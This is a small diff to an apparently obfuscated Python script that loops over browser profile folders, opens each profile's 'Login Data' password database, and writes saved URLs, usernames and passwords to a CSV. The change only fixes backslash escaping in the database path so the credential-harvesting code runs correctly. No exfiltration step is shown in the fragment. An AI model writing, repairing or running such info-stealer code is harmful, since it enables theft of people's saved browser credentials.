@@ -86,7 +86,7 @@ if __name__ == '__main__':
             cw.writerow(["index", "url", "username", "password"])
 
             for folder in f:
-                c_db = o.path.normpath(f"{C2}\{folder}\Login Data")
+                c_db = o.path.normpath(f"{C2}\\{folder}\\Login Data")  # Fixed the backslashes
                 conn = k5(c_db)
                 if s_k and conn:
                     cursor = conn.cursor()
